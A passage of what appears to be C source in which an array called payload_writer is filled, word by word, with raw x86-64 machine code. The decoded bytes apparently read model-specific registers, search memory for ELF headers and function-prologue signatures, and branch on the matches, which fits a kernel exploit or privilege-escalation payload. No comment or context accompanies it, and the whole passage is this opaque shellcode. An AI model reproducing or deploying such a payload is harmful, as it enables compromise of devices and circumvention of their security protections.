  payload_writer[2048] = 0x44c67024;
  payload_writer[2049] = 0x48487124;
  payload_writer[2050] = 0x7c30bb8d;
  payload_writer[2051] = 0x44c60030;
  payload_writer[2052] = 0xba897224;
  payload_writer[2053] = 0x0000000c;
  payload_writer[2054] = 0x732444c6;
  payload_writer[2055] = 0x2444c6e5;
  payload_writer[2056] = 0x44c65374;
  payload_writer[2057] = 0xc6487524;
  payload_writer[2058] = 0x83762444;
  payload_writer[2059] = 0x772444c6;
  payload_writer[2060] = 0x2444c6ec;
  payload_writer[2061] = 0x44c65878;
  payload_writer[2062] = 0xc6487924;
  payload_writer[2063] = 0x8d7a2444;
  payload_writer[2064] = 0x7b2444c6;
  payload_writer[2065] = 0x8515ff1d;
  payload_writer[2066] = 0x8500003e;
  payload_writer[2067] = 0x481575c0;
  payload_writer[2068] = 0x382444c7;
  payload_writer[2069] = 0x00000600;
  payload_writer[2070] = 0x40838d48;
  payload_writer[2071] = 0xe9001146;
  payload_writer[2072] = 0x00000ba8;
  payload_writer[2073] = 0x7c2444c6;
  payload_writer[2074] = 0x748d4855;
  payload_writer[2075] = 0x44c67c24;
  payload_writer[2076] = 0x48487d24;
  payload_writer[2077] = 0xaf90bb8d;
  payload_writer[2078] = 0x44c60011;
  payload_writer[2079] = 0xba897e24;
  payload_writer[2080] = 0x0000000c;
  payload_writer[2081] = 0x7f2444c6;
  payload_writer[2082] = 0x2484c6e5;
  payload_writer[2083] = 0x00000080;
  payload_writer[2084] = 0x2484c653;
  payload_writer[2085] = 0x00000081;
  payload_writer[2086] = 0x2484c648;
  payload_writer[2087] = 0x00000082;
  payload_writer[2088] = 0x2484c683;
  payload_writer[2089] = 0x00000083;
  payload_writer[2090] = 0x2484c6ec;
  payload_writer[2091] = 0x00000084;
  payload_writer[2092] = 0x2484c658;
  payload_writer[2093] = 0x00000085;
  payload_writer[2094] = 0x2484c648;
  payload_writer[2095] = 0x00000086;
  payload_writer[2096] = 0x2484c68d;
  payload_writer[2097] = 0x00000087;
  payload_writer[2098] = 0x0115ff1d;
  payload_writer[2099] = 0x8500003e;
  payload_writer[2100] = 0x481575c0;
  payload_writer[2101] = 0x382444c7;
  payload_writer[2102] = 0x00000555;
  payload_writer[2103] = 0xc0838d48;
  payload_writer[2104] = 0xe900405b;
  payload_writer[2105] = 0x00000b24;
  payload_writer[2106] = 0x882484c6;
  payload_writer[2107] = 0x55000000;
  payload_writer[2108] = 0x24b48d48;
  payload_writer[2109] = 0x00000088;
  payload_writer[2110] = 0x892484c6;
  payload_writer[2111] = 0x48000000;
  payload_writer[2112] = 0x20bb8d48;
  payload_writer[2113] = 0xc60011ac;
  payload_writer[2114] = 0x008a2484;
  payload_writer[2115] = 0xba890000;
  payload_writer[2116] = 0x0000000c;
  payload_writer[2117] = 0x8b2484c6;
  payload_writer[2118] = 0xe5000000;
  payload_writer[2119] = 0x8c2484c6;
  payload_writer[2120] = 0x53000000;
  payload_writer[2121] = 0x8d2484c6;
  payload_writer[2122] = 0x48000000;
  payload_writer[2123] = 0x8e2484c6;
  payload_writer[2124] = 0x83000000;
  payload_writer[2125] = 0x8f2484c6;
  payload_writer[2126] = 0xec000000;
  payload_writer[2127] = 0x902484c6;
  payload_writer[2128] = 0x58000000;
  payload_writer[2129] = 0x912484c6;
  payload_writer[2130] = 0x48000000;
  payload_writer[2131] = 0x922484c6;
  payload_writer[2132] = 0x8d000000;
  payload_writer[2133] = 0x932484c6;
  payload_writer[2134] = 0x1d000000;
  payload_writer[2135] = 0x3d6e15ff;
  payload_writer[2136] = 0xc0850000;
  payload_writer[2137] = 0xc7481575;
  payload_writer[2138] = 0x53382444;
  payload_writer[2139] = 0x48000005;
  payload_writer[2140] = 0x5800838d;
  payload_writer[2141] = 0x91e90040;
  payload_writer[2142] = 0xc600000a;
  payload_writer[2143] = 0x00942484;
  payload_writer[2144] = 0x48550000;
  payload_writer[2145] = 0x9424b48d;
  payload_writer[2146] = 0xc6000000;
  payload_writer[2147] = 0x00952484;
  payload_writer[2148] = 0x48480000;
  payload_writer[2149] = 0xac50bb8d;
  payload_writer[2150] = 0x84c60011;
  payload_writer[2151] = 0x00009624;
  payload_writer[2152] = 0x0cba8900;
  payload_writer[2153] = 0xc6000000;
  payload_writer[2154] = 0x00972484;
  payload_writer[2155] = 0xc6e50000;
  payload_writer[2156] = 0x00982484;
  payload_writer[2157] = 0xc6530000;
  payload_writer[2158] = 0x00992484;
  payload_writer[2159] = 0xc6480000;
  payload_writer[2160] = 0x009a2484;
  payload_writer[2161] = 0xc6830000;
  payload_writer[2162] = 0x009b2484;
  payload_writer[2163] = 0xc6ec0000;
  payload_writer[2164] = 0x009c2484;
  payload_writer[2165] = 0xc6580000;
  payload_writer[2166] = 0x009d2484;
  payload_writer[2167] = 0xc6480000;
  payload_writer[2168] = 0x009e2484;
  payload_writer[2169] = 0xc68d0000;
  payload_writer[2170] = 0x009f2484;
  payload_writer[2171] = 0xff1d0000;
  payload_writer[2172] = 0x003cdb15;
  payload_writer[2173] = 0x75c08500;
  payload_writer[2174] = 0x44c74815;
  payload_writer[2175] = 0x05503824;
  payload_writer[2176] = 0x8d480000;
  payload_writer[2177] = 0x40590083;
  payload_writer[2178] = 0x09fee900;
  payload_writer[2179] = 0x84c60000;
  payload_writer[2180] = 0x0000a024;
  payload_writer[2181] = 0x8d485500;
  payload_writer[2182] = 0x00a024b4;
  payload_writer[2183] = 0x84c60000;
  payload_writer[2184] = 0x0000a124;
  payload_writer[2185] = 0x8d484800;
  payload_writer[2186] = 0x435e80bb;
  payload_writer[2187] = 0x2484c600;
  payload_writer[2188] = 0x000000a2;
  payload_writer[2189] = 0x000cba89;
  payload_writer[2190] = 0x84c60000;
  payload_writer[2191] = 0x0000a324;
  payload_writer[2192] = 0x84c6e500;
  payload_writer[2193] = 0x0000a424;
  payload_writer[2194] = 0x84c65300;
  payload_writer[2195] = 0x0000a524;
  payload_writer[2196] = 0x84c64800;
  payload_writer[2197] = 0x0000a624;
  payload_writer[2198] = 0x84c68300;
  payload_writer[2199] = 0x0000a724;
  payload_writer[2200] = 0x84c6ec00;
  payload_writer[2201] = 0x0000a824;
  payload_writer[2202] = 0x84c65800;
  payload_writer[2203] = 0x0000a924;
  payload_writer[2204] = 0x84c64800;
  payload_writer[2205] = 0x0000aa24;
  payload_writer[2206] = 0x84c68d00;
  payload_writer[2207] = 0x0000ab24;
  payload_writer[2208] = 0x15ff1d00;
  payload_writer[2209] = 0x00003c48;
  payload_writer[2210] = 0x0e75c085;
  payload_writer[2211] = 0x2444c748;
  payload_writer[2212] = 0x00050538;
  payload_writer[2213] = 0x0088e900;
  payload_writer[2214] = 0x84c60000;
  payload_writer[2215] = 0x0000ac24;
  payload_writer[2216] = 0x8d485500;
  payload_writer[2217] = 0x00ac24b4;
  payload_writer[2218] = 0x84c60000;
  payload_writer[2219] = 0x0000ad24;
  payload_writer[2220] = 0x8d494800;
  payload_writer[2221] = 0x600024bc;
  payload_writer[2222] = 0x84c60043;
  payload_writer[2223] = 0x0000ae24;
  payload_writer[2224] = 0x0cba8900;
  payload_writer[2225] = 0xc6000000;
  payload_writer[2226] = 0x00af2484;
  payload_writer[2227] = 0xc6e50000;
  payload_writer[2228] = 0x00b02484;
  payload_writer[2229] = 0xc6530000;
  payload_writer[2230] = 0x00b12484;
  payload_writer[2231] = 0xc6480000;
  payload_writer[2232] = 0x00b22484;
  payload_writer[2233] = 0xc6830000;
  payload_writer[2234] = 0x00b32484;
  payload_writer[2235] = 0xc6ec0000;
  payload_writer[2236] = 0x00b42484;
  payload_writer[2237] = 0xc6580000;
  payload_writer[2238] = 0x00b52484;
  payload_writer[2239] = 0xc6480000;
  payload_writer[2240] = 0x00b62484;
  payload_writer[2241] = 0xc68d0000;
  payload_writer[2242] = 0x00b72484;
  payload_writer[2243] = 0xff1d0000;
  payload_writer[2244] = 0x003bbb15;
  payload_writer[2245] = 0x75c08500;
  payload_writer[2246] = 0x44c74816;
  payload_writer[2247] = 0x05033824;
  payload_writer[2248] = 0x8d490000;
  payload_writer[2249] = 0xa6302484;
  payload_writer[2250] = 0xdde9001e;
  payload_writer[2251] = 0xc6000008;
  payload_writer[2252] = 0x00b82484;
  payload_writer[2253] = 0x48550000;
  payload_writer[2254] = 0xb824b48d;
  payload_writer[2255] = 0xc6000000;
  payload_writer[2256] = 0x00b92484;
  payload_writer[2257] = 0x49480000;
  payload_writer[2258] = 0x7024bc8d;
  payload_writer[2259] = 0xc600435c;
  payload_writer[2260] = 0x00ba2484;
  payload_writer[2261] = 0xba890000;
  payload_writer[2262] = 0x0000000c;
  payload_writer[2263] = 0xbb2484c6;
  payload_writer[2264] = 0xe5000000;
  payload_writer[2265] = 0xbc2484c6;
  payload_writer[2266] = 0x53000000;
  payload_writer[2267] = 0xbd2484c6;
  payload_writer[2268] = 0x48000000;
  payload_writer[2269] = 0xbe2484c6;
  payload_writer[2270] = 0x83000000;
  payload_writer[2271] = 0xbf2484c6;
  payload_writer[2272] = 0xec000000;
  payload_writer[2273] = 0xc02484c6;
  payload_writer[2274] = 0x58000000;
  payload_writer[2275] = 0xc12484c6;
  payload_writer[2276] = 0x48000000;
  payload_writer[2277] = 0xc22484c6;
  payload_writer[2278] = 0x8d000000;
  payload_writer[2279] = 0xc32484c6;
  payload_writer[2280] = 0x1d000000;
  payload_writer[2281] = 0x3b2615ff;
  payload_writer[2282] = 0xc0850000;
  payload_writer[2283] = 0xc0310774;
  payload_writer[2284] = 0x000857e9;
  payload_writer[2285] = 0x44c74800;
  payload_writer[2286] = 0x05003824;
  payload_writer[2287] = 0x8d490000;
  payload_writer[2288] = 0xa5202484;
  payload_writer[2289] = 0x41e9001e;
  payload_writer[2290] = 0x0f000008;
  payload_writer[2291] = 0xe2c14832;
  payload_writer[2292] = 0x2444c620;
  payload_writer[2293] = 0x09487f14;
  payload_writer[2294] = 0x2444c6d0;
  payload_writer[2295] = 0x44c64515;
  payload_writer[2296] = 0x484c1624;
  payload_writer[2297] = 0x1424748d;
  payload_writer[2298] = 0x172444c6;
  payload_writer[2299] = 0xb88d4846;
  payload_writer[2300] = 0xffcf47c0;
  payload_writer[2301] = 0x244c8948;
  payload_writer[2302] = 0x0004ba08;
  payload_writer[2303] = 0xff410000;
  payload_writer[2304] = 0x058b4cd0;
  payload_writer[2305] = 0x00003ac8;
  payload_writer[2306] = 0x8b48c085;
  payload_writer[2307] = 0x0f08244c;
  payload_writer[2308] = 0x00009d85;
  payload_writer[2309] = 0x48320f00;
  payload_writer[2310] = 0xc620e2c1;
  payload_writer[2311] = 0x00c42484;
  payload_writer[2312] = 0x48550000;
  payload_writer[2313] = 0x84c6d009;
  payload_writer[2314] = 0x0000c524;
  payload_writer[2315] = 0x8d484800;
  payload_writer[2316] = 0xcf47c098;
  payload_writer[2317] = 0x2484c6ff;
  payload_writer[2318] = 0x000000c6;
  payload_writer[2319] = 0x2484c689;
  payload_writer[2320] = 0x000000c7;
  payload_writer[2321] = 0xb48d48e5;
  payload_writer[2322] = 0x0000c424;
  payload_writer[2323] = 0x2484c600;
  payload_writer[2324] = 0x000000c8;
  payload_writer[2325] = 0xbb8d4853;
  payload_writer[2326] = 0x00017f30;
  payload_writer[2327] = 0xc92484c6;
  payload_writer[2328] = 0x48000000;
  payload_writer[2329] = 0x00000cba;
  payload_writer[2330] = 0x2484c600;
  payload_writer[2331] = 0x000000ca;
  payload_writer[2332] = 0x2484c683;
  payload_writer[2333] = 0x000000cb;
  payload_writer[2334] = 0x2484c6ec;
  payload_writer[2335] = 0x000000cc;
  payload_writer[2336] = 0x2484c658;
  payload_writer[2337] = 0x000000cd;
  payload_writer[2338] = 0x2484c648;
  payload_writer[2339] = 0x000000ce;
  payload_writer[2340] = 0x2484c68d;
  payload_writer[2341] = 0x000000cf;
  payload_writer[2342] = 0xd0ff411d;
  payload_writer[2343] = 0x850fc085;
  payload_writer[2344] = 0xffffff0a;
  payload_writer[2345] = 0x2444c748;
  payload_writer[2346] = 0x00047038;
  payload_writer[2347] = 0x00e2e900;
  payload_writer[2348] = 0x320f0000;
  payload_writer[2349] = 0x20e2c148;
  payload_writer[2350] = 0x182444c6;
  payload_writer[2351] = 0xd009487f;
  payload_writer[2352] = 0x192444c6;
  payload_writer[2353] = 0x2444c645;
  payload_writer[2354] = 0x8d484c1a;
  payload_writer[2355] = 0xc6182474;
  payload_writer[2356] = 0x461b2444;
  payload_writer[2357] = 0x30b88d48;
  payload_writer[2358] = 0x48ffcf48;
  payload_writer[2359] = 0x08244c89;
  payload_writer[2360] = 0x000004ba;
  payload_writer[2361] = 0xd0ff4100;
  payload_writer[2362] = 0xe1058b4c;
  payload_writer[2363] = 0x85000039;
  payload_writer[2364] = 0x4c8b48c0;
  payload_writer[2365] = 0x850f0824;
  payload_writer[2366] = 0x000000a4;
  payload_writer[2367] = 0xc148320f;
  payload_writer[2368] = 0x84c620e2;
  payload_writer[2369] = 0x0000d024;
  payload_writer[2370] = 0x09485500;
  payload_writer[2371] = 0x2484c6d0;
  payload_writer[2372] = 0x000000d1;
  payload_writer[2373] = 0x988d4848;
  payload_writer[2374] = 0xffcf4830;
  payload_writer[2375] = 0xd22484c6;
  payload_writer[2376] = 0x89000000;
  payload_writer[2377] = 0xd32484c6;
  payload_writer[2378] = 0xe5000000;
  payload_writer[2379] = 0x24b48d48;
  payload_writer[2380] = 0x000000d0;
  payload_writer[2381] = 0xd42484c6;
  payload_writer[2382] = 0x53000000;
  payload_writer[2383] = 0x30bb8d48;
  payload_writer[2384] = 0xc600017f;
  payload_writer[2385] = 0x00d52484;
  payload_writer[2386] = 0xba480000;
  payload_writer[2387] = 0x0000000c;
  payload_writer[2388] = 0xd62484c6;
  payload_writer[2389] = 0x83000000;
  payload_writer[2390] = 0xd72484c6;
  payload_writer[2391] = 0xec000000;
  payload_writer[2392] = 0xd82484c6;
  payload_writer[2393] = 0x58000000;
  payload_writer[2394] = 0xd92484c6;
  payload_writer[2395] = 0x48000000;
  payload_writer[2396] = 0xda2484c6;
  payload_writer[2397] = 0x8d000000;
  payload_writer[2398] = 0xdb2484c6;
  payload_writer[2399] = 0x1d000000;
  payload_writer[2400] = 0x85d0ff41;
  payload_writer[2401] = 0x23850fc0;
  payload_writer[2402] = 0x48fffffe;
  payload_writer[2403] = 0x382444c7;
  payload_writer[2404] = 0x00000471;
  payload_writer[2405] = 0x40838d48;
  payload_writer[2406] = 0xe900149e;
  payload_writer[2407] = 0x0000066c;
  payload_writer[2408] = 0xc148320f;
  payload_writer[2409] = 0x44c620e2;
  payload_writer[2410] = 0x487f1c24;
  payload_writer[2411] = 0x44c6d009;
  payload_writer[2412] = 0xc6451d24;
  payload_writer[2413] = 0x4c1e2444;
  payload_writer[2414] = 0x24748d48;
  payload_writer[2415] = 0x2444c61c;
  payload_writer[2416] = 0x8d48461f;
  payload_writer[2417] = 0xcf6a30b8;
  payload_writer[2418] = 0x4c8948ff;
  payload_writer[2419] = 0x04ba0824;
  payload_writer[2420] = 0x41000000;
  payload_writer[2421] = 0x8b4cd0ff;
  payload_writer[2422] = 0x0038f305;
  payload_writer[2423] = 0x48c08500;
  payload_writer[2424] = 0x08244c8b;
  payload_writer[2425] = 0x00a4850f;
  payload_writer[2426] = 0x320f0000;
  payload_writer[2427] = 0x20e2c148;
  payload_writer[2428] = 0xdc2484c6;
  payload_writer[2429] = 0x55000000;
  payload_writer[2430] = 0xc6d00948;
  payload_writer[2431] = 0x00dd2484;
  payload_writer[2432] = 0x48480000;
  payload_writer[2433] = 0x6a30988d;
  payload_writer[2434] = 0x84c6ffcf;
  payload_writer[2435] = 0x0000de24;
  payload_writer[2436] = 0x84c68900;
  payload_writer[2437] = 0x0000df24;
  payload_writer[2438] = 0x8d48e500;
  payload_writer[2439] = 0x00dc24b4;
  payload_writer[2440] = 0x84c60000;
  payload_writer[2441] = 0x0000e024;
  payload_writer[2442] = 0x8d485300;
  payload_writer[2443] = 0x017f30bb;
  payload_writer[2444] = 0x2484c600;
  payload_writer[2445] = 0x000000e1;
  payload_writer[2446] = 0x000cba48;
  payload_writer[2447] = 0x84c60000;
  payload_writer[2448] = 0x0000e224;
  payload_writer[2449] = 0x84c68300;
  payload_writer[2450] = 0x0000e324;
  payload_writer[2451] = 0x84c6ec00;
  payload_writer[2452] = 0x0000e424;
  payload_writer[2453] = 0x84c65800;
  payload_writer[2454] = 0x0000e524;
  payload_writer[2455] = 0x84c64800;
  payload_writer[2456] = 0x0000e624;
  payload_writer[2457] = 0x84c68d00;
  payload_writer[2458] = 0x0000e724;
  payload_writer[2459] = 0xff411d00;
  payload_writer[2460] = 0x0fc085d0;
  payload_writer[2461] = 0xfffd3585;
  payload_writer[2462] = 0x44c748ff;
  payload_writer[2463] = 0x04503824;
  payload_writer[2464] = 0x8d480000;
  payload_writer[2465] = 0x14a7b083;
  payload_writer[2466] = 0x057ee900;
  payload_writer[2467] = 0x320f0000;
  payload_writer[2468] = 0x20e2c148;
  payload_writer[2469] = 0x202444c6;
  payload_writer[2470] = 0xd009487f;
  payload_writer[2471] = 0x212444c6;
  payload_writer[2472] = 0x2444c645;
  payload_writer[2473] = 0x8d484c22;
  payload_writer[2474] = 0xc6202474;
  payload_writer[2475] = 0x46232444;
  payload_writer[2476] = 0xc0b88d48;
  payload_writer[2477] = 0x48ffcf14;
  payload_writer[2478] = 0x08244c89;
  payload_writer[2479] = 0x000004ba;
  payload_writer[2480] = 0xd0ff4100;
  payload_writer[2481] = 0x05058b4c;
  payload_writer[2482] = 0x85000038;
  payload_writer[2483] = 0x4c8b48c0;
  payload_writer[2484] = 0x850f0824;
  payload_writer[2485] = 0x0000009d;
  payload_writer[2486] = 0xc148320f;
  payload_writer[2487] = 0x84c620e2;
  payload_writer[2488] = 0x0000e824;
  payload_writer[2489] = 0x09485500;
  payload_writer[2490] = 0x2484c6d0;
  payload_writer[2491] = 0x000000e9;
  payload_writer[2492] = 0x2484c648;
  payload_writer[2493] = 0x000000ea;
  payload_writer[2494] = 0xa08d4c89;
  payload_writer[2495] = 0xffcf14c0;
  payload_writer[2496] = 0xeb2484c6;
  payload_writer[2497] = 0xe5000000;
  payload_writer[2498] = 0x24b48d48;
  payload_writer[2499] = 0x000000e8;
  payload_writer[2500] = 0xec2484c6;
  payload_writer[2501] = 0x53000000;
  payload_writer[2502] = 0x50b88d48;
  payload_writer[2503] = 0xc600038a;
  payload_writer[2504] = 0x00ed2484;
  payload_writer[2505] = 0xba480000;
  payload_writer[2506] = 0x0000000c;
  payload_writer[2507] = 0xee2484c6;
  payload_writer[2508] = 0x83000000;
  payload_writer[2509] = 0xef2484c6;
  payload_writer[2510] = 0xec000000;
  payload_writer[2511] = 0xf02484c6;
  payload_writer[2512] = 0x58000000;
  payload_writer[2513] = 0xf12484c6;
  payload_writer[2514] = 0x48000000;
  payload_writer[2515] = 0xf22484c6;
  payload_writer[2516] = 0x8d000000;
  payload_writer[2517] = 0xf32484c6;
  payload_writer[2518] = 0x1d000000;
  payload_writer[2519] = 0x85d0ff41;
  payload_writer[2520] = 0x47850fc0;
  payload_writer[2521] = 0x48fffffc;
  payload_writer[2522] = 0x382444c7;
  payload_writer[2523] = 0x00000406;
  payload_writer[2524] = 0x0000e2e9;
  payload_writer[2525] = 0x48320f00;
  payload_writer[2526] = 0xc620e2c1;
  payload_writer[2527] = 0x7f242444;
  payload_writer[2528] = 0xc6d00948;
  payload_writer[2529] = 0x45252444;
  payload_writer[2530] = 0x262444c6;
  payload_writer[2531] = 0x748d484c;
  payload_writer[2532] = 0x44c62424;
  payload_writer[2533] = 0x48462724;
  payload_writer[2534] = 0x14d0b88d;
  payload_writer[2535] = 0x8948ffcf;
  payload_writer[2536] = 0xba08244c;
  payload_writer[2537] = 0x00000004;
  payload_writer[2538] = 0x4cd0ff41;
  payload_writer[2539] = 0x371e058b;
  payload_writer[2540] = 0xc0850000;
  payload_writer[2541] = 0x244c8b48;
  payload_writer[2542] = 0xa5850f08;
  payload_writer[2543] = 0x0f000000;
  payload_writer[2544] = 0xe2c14832;
  payload_writer[2545] = 0x2484c620;
  payload_writer[2546] = 0x000000f4;
  payload_writer[2547] = 0xd0094855;
  payload_writer[2548] = 0xf52484c6;
  payload_writer[2549] = 0x48000000;
  payload_writer[2550] = 0xf62484c6;
  payload_writer[2551] = 0x89000000;
  payload_writer[2552] = 0xd0a08d4c;
  payload_writer[2553] = 0xc6ffcf14;
  payload_writer[2554] = 0x00f72484;
  payload_writer[2555] = 0x48e50000;
  payload_writer[2556] = 0xf424b48d;
  payload_writer[2557] = 0xc6000000;
  payload_writer[2558] = 0x00f82484;
  payload_writer[2559] = 0x48530000;
  payload_writer[2560] = 0x8a50b88d;
  payload_writer[2561] = 0x84c60003;
  payload_writer[2562] = 0x0000f924;
  payload_writer[2563] = 0x0cba4800;
  payload_writer[2564] = 0xc6000000;
  payload_writer[2565] = 0x00fa2484;
  payload_writer[2566] = 0xc6830000;
  payload_writer[2567] = 0x00fb2484;
  payload_writer[2568] = 0xc6ec0000;
  payload_writer[2569] = 0x00fc2484;
  payload_writer[2570] = 0xc6580000;
  payload_writer[2571] = 0x00fd2484;
  payload_writer[2572] = 0xc6480000;
  payload_writer[2573] = 0x00fe2484;
  payload_writer[2574] = 0xc68d0000;
  payload_writer[2575] = 0x00ff2484;
  payload_writer[2576] = 0x411d0000;
  payload_writer[2577] = 0xc085d0ff;
  payload_writer[2578] = 0xfb60850f;
  payload_writer[2579] = 0xc748ffff;
  payload_writer[2580] = 0x05382444;
  payload_writer[2581] = 0x49000004;
  payload_writer[2582] = 0x7024848d;
  payload_writer[2583] = 0xe900286d;
  payload_writer[2584] = 0x000003a8;
  payload_writer[2585] = 0x8948320f;
  payload_writer[2586] = 0x2444c6d7;
  payload_writer[2587] = 0xc1487f28;
  payload_writer[2588] = 0x44c620e7;
  payload_writer[2589] = 0x48452924;
  payload_writer[2590] = 0x44c6f809;
  payload_writer[2591] = 0xc64c2a24;
  payload_writer[2592] = 0x462b2444;
  payload_writer[2593] = 0x24748d48;
  payload_writer[2594] = 0x4c894828;
  payload_writer[2595] = 0x8d480824;
  payload_writer[2596] = 0xcf1600b8;
  payload_writer[2597] = 0x0004baff;
  payload_writer[2598] = 0xff410000;
  payload_writer[2599] = 0x058b4cd0;
  payload_writer[2600] = 0x0000362c;
  payload_writer[2601] = 0x8b48c085;
  payload_writer[2602] = 0x0f08244c;
  payload_writer[2603] = 0x0000a585;
  payload_writer[2604] = 0x48320f00;
  payload_writer[2605] = 0xc620e2c1;
  payload_writer[2606] = 0x01002484;
  payload_writer[2607] = 0x48550000;
  payload_writer[2608] = 0x84c6d009;
  payload_writer[2609] = 0x00010124;
  payload_writer[2610] = 0x84c64800;
  payload_writer[2611] = 0x00010224;
  payload_writer[2612] = 0x8d4c8900;
  payload_writer[2613] = 0xcf1600a0;
  payload_writer[2614] = 0x2484c6ff;
  payload_writer[2615] = 0x00000103;
  payload_writer[2616] = 0xb48d48e5;
  payload_writer[2617] = 0x00010024;
  payload_writer[2618] = 0x2484c600;
  payload_writer[2619] = 0x00000104;
  payload_writer[2620] = 0xb88d4853;
  payload_writer[2621] = 0x00038a50;
  payload_writer[2622] = 0x052484c6;
  payload_writer[2623] = 0x48000001;
  payload_writer[2624] = 0x00000cba;
  payload_writer[2625] = 0x2484c600;
  payload_writer[2626] = 0x00000106;
  payload_writer[2627] = 0x2484c683;
  payload_writer[2628] = 0x00000107;
  payload_writer[2629] = 0x2484c6ec;
  payload_writer[2630] = 0x00000108;
  payload_writer[2631] = 0x2484c658;
  payload_writer[2632] = 0x00000109;
  payload_writer[2633] = 0x2484c648;
  payload_writer[2634] = 0x0000010a;
  payload_writer[2635] = 0x2484c68d;
  payload_writer[2636] = 0x0000010b;
  payload_writer[2637] = 0xd0ff411d;
  payload_writer[2638] = 0x850fc085;
  payload_writer[2639] = 0xfffffa6e;
  payload_writer[2640] = 0x2444c748;
  payload_writer[2641] = 0x00040038;
  payload_writer[2642] = 0x848d4900;
  payload_writer[2643] = 0x286c4024;
  payload_writer[2644] = 0x02b6e900;
  payload_writer[2645] = 0x320f0000;
  payload_writer[2646] = 0x20e2c148;
  payload_writer[2647] = 0x2c2444c6;
  payload_writer[2648] = 0xd009487f;
  payload_writer[2649] = 0x2d2444c6;
  payload_writer[2650] = 0x2444c645;
  payload_writer[2651] = 0x8d484c2e;
  payload_writer[2652] = 0xc62c2474;
  payload_writer[2653] = 0x462f2444;
  payload_writer[2654] = 0x00b88d48;
  payload_writer[2655] = 0x48ffc5e0;
  payload_writer[2656] = 0x08244c89;
  payload_writer[2657] = 0x000004ba;
  payload_writer[2658] = 0xd0ff4100;
  payload_writer[2659] = 0x3d058b4c;
  payload_writer[2660] = 0x85000035;
  payload_writer[2661] = 0x4c8b48c0;
  payload_writer[2662] = 0x850f0824;
  payload_writer[2663] = 0x00000099;
  payload_writer[2664] = 0xc148320f;
  payload_writer[2665] = 0x84c620e2;
  payload_writer[2666] = 0x00010c24;
  payload_writer[2667] = 0x89485500;
  payload_writer[2668] = 0x2484c6d3;
  payload_writer[2669] = 0x0000010d;
  payload_writer[2670] = 0xc3094848;
  payload_writer[2671] = 0x0e2484c6;
  payload_writer[2672] = 0x89000001;
  payload_writer[2673] = 0x0f2484c6;
  payload_writer[2674] = 0xe5000001;
  payload_writer[2675] = 0x24b48d48;
  payload_writer[2676] = 0x0000010c;
  payload_writer[2677] = 0x102484c6;
  payload_writer[2678] = 0x53000001;
  payload_writer[2679] = 0x20bb8d48;
  payload_writer[2680] = 0xc6ffe3d6;
  payload_writer[2681] = 0x01112484;
  payload_writer[2682] = 0xba480000;
  payload_writer[2683] = 0x0000000c;
  payload_writer[2684] = 0x122484c6;
  payload_writer[2685] = 0x83000001;
  payload_writer[2686] = 0x132484c6;
  payload_writer[2687] = 0xec000001;
  payload_writer[2688] = 0x142484c6;
  payload_writer[2689] = 0x58000001;
  payload_writer[2690] = 0x152484c6;
  payload_writer[2691] = 0x48000001;
  payload_writer[2692] = 0x162484c6;
  payload_writer[2693] = 0x8d000001;
  payload_writer[2694] = 0x172484c6;
  payload_writer[2695] = 0x1d000001;
  payload_writer[2696] = 0x85d0ff41;
  payload_writer[2697] = 0x83850fc0;
  payload_writer[2698] = 0x48fffff9;
  payload_writer[2699] = 0x382444c7;
  payload_writer[2700] = 0x00000370;
  payload_writer[2701] = 0x0001cce9;
  payload_writer[2702] = 0x48320f00;
  payload_writer[2703] = 0x44c6d789;
  payload_writer[2704] = 0x487f3024;
  payload_writer[2705] = 0xc620e7c1;
  payload_writer[2706] = 0x45312444;
  payload_writer[2707] = 0xc6f80948;
  payload_writer[2708] = 0x4c322444;
  payload_writer[2709] = 0x332444c6;
  payload_writer[2710] = 0x748d4846;
  payload_writer[2711] = 0x89483024;
  payload_writer[2712] = 0x4808244c;
  payload_writer[2713] = 0xe0f0b88d;
  payload_writer[2714] = 0x04baffc5;
  payload_writer[2715] = 0x41000000;
  payload_writer[2716] = 0x8b4cd0ff;
  payload_writer[2717] = 0x00345705;
  payload_writer[2718] = 0x48c08500;
  payload_writer[2719] = 0x08244c8b;
  payload_writer[2720] = 0x00a4850f;
  payload_writer[2721] = 0x320f0000;
  payload_writer[2722] = 0x20e2c148;
  payload_writer[2723] = 0x182484c6;
  payload_writer[2724] = 0x55000001;
  payload_writer[2725] = 0xc6d00948;
  payload_writer[2726] = 0x01192484;
  payload_writer[2727] = 0x48480000;
  payload_writer[2728] = 0xe0f0988d;
  payload_writer[2729] = 0x84c6ffc5;
  payload_writer[2730] = 0x00011a24;
  payload_writer[2731] = 0x84c68900;
  payload_writer[2732] = 0x00011b24;
  payload_writer[2733] = 0x8d48e500;
  payload_writer[2734] = 0x011824b4;
  payload_writer[2735] = 0x84c60000;
  payload_writer[2736] = 0x00011c24;
  payload_writer[2737] = 0x8d485300;
  payload_writer[2738] = 0x1df550bb;
  payload_writer[2739] = 0x2484c600;
  payload_writer[2740] = 0x0000011d;
  payload_writer[2741] = 0x000cba48;
  payload_writer[2742] = 0x84c60000;
  payload_writer[2743] = 0x00011e24;
  payload_writer[2744] = 0x84c68300;
  payload_writer[2745] = 0x00011f24;
  payload_writer[2746] = 0x84c6ec00;
  payload_writer[2747] = 0x00012024;
  payload_writer[2748] = 0x84c65800;
  payload_writer[2749] = 0x00012124;
  payload_writer[2750] = 0x84c64800;
  payload_writer[2751] = 0x00012224;
  payload_writer[2752] = 0x84c68d00;
  payload_writer[2753] = 0x00012324;
  payload_writer[2754] = 0xff411d00;
  payload_writer[2755] = 0x0fc085d0;
  payload_writer[2756] = 0xfff89985;
  payload_writer[2757] = 0x44c748ff;
  payload_writer[2758] = 0x03553824;
  payload_writer[2759] = 0x8d480000;
  payload_writer[2760] = 0x3b966083;
  payload_writer[2761] = 0x00e2e900;
  payload_writer[2762] = 0x320f0000;
  payload_writer[2763] = 0x20e2c148;
  payload_writer[2764] = 0x342444c6;
  payload_writer[2765] = 0xd009487f;
  payload_writer[2766] = 0x352444c6;
  payload_writer[2767] = 0x2444c645;
  payload_writer[2768] = 0x04ba4c36;
  payload_writer[2769] = 0xc6000000;
  payload_writer[2770] = 0x46372444;
  payload_writer[2771] = 0x24748d48;
  payload_writer[2772] = 0xb88d4834;
  payload_writer[2773] = 0xffc5e530;
  payload_writer[2774] = 0x83d0ff41;
  payload_writer[2775] = 0xc085ffca;
  payload_writer[2776] = 0x00bb850f;
  payload_writer[2777] = 0x82b90000;
  payload_writer[2778] = 0xc6c00000;
  payload_writer[2779] = 0x01242484;
  payload_writer[2780] = 0x0f550000;
  payload_writer[2781] = 0xd1894832;
  payload_writer[2782] = 0x252484c6;
  payload_writer[2783] = 0x48000001;
